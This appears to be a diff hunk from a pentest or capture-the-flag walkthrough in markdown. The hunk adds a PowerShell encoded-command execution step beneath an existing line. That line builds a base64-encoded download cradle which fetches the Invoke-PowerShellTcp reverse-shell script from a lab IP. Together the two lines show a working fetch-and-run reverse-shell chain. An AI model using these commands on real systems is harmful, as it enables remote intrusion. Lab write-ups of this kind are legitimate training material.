@@ -27,6 +27,9 @@ tasklist /v |findstr -i cloudme
 ```bash
 echo -n iex(new-object net.webclient).downloadstring('http://10.10.16.3/Invoke-PowerShellTcp.ps1') | iconv --to-code UTF-16LE | base64 -w0
 ```
+```powershell
+powershell -encodedcommand <encoded>
+```
  
 </details>
 
